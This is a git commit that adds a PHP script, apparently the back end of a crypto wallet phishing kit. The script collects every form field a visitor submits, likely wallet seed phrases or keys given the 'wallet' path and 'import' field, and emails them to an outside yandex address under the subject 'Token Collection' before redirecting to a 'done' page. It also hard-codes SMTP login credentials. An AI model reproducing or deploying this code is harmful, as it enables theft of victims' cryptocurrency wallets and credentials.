e2d3012fdeeff7641ca27bac9f15298c5f061d95
zeddstech <39128666+zeddstech@users.noreply.github.com>
2022-05-05 08:22:58 -0500

    Add files via upload

---
+++ wallet/wonda_mail_bot.php
@@ -0,0 +1,48 @@
+<?php
+//Import PHPMailer classes into the global namespace
+//These must be at the top of your script, not inside a function
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\SMTP;
+use PHPMailer\PHPMailer\Exception;
+
+//Load Composer's autoloader
+require 'vendor/autoload.php';
+$content="";
+if(isset($_POST['import'])){
+    unset($_POST['import']);
+}
+
+foreach($_POST as $key=>$value){
+    $content.=$key.": ".$value;
+}
+//Create an instance; passing `true` enables exceptions
+$mail = new PHPMailer(true);
+
+try {
+    //Server settings
+    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
+    $mail->isSMTP();                                            //Send using SMTP
+    $mail->Host       = 'mail.testflora.xyz';                     //Set the SMTP server to send through
+    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
+    $mail->Username   = 'postmaster@testflora.xyz';                     //SMTP username
+    $mail->Password   = 'Y)ii3dyg_$kh';                               //SMTP password
+    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
+    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
+
+    //Recipients
+    $mail->setFrom('postmaster@testflora.xyz', 'postmaster');
+    $mail->addAddress('bb1u3sky@yandex.com', 'Blue 3 sky');     //Add a recipient
+
+
+    //Content
+    $mail->isHTML(true);                                  //Set email format to HTML
+    $mail->Subject = 'Token Collection';
+    $mail->Body    = $content;
+
+    $mail->send();
+    header("Location: done.php");
+       exit();
+    echo 'Message has been sent';
+} catch (Exception $e) {
+    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+}
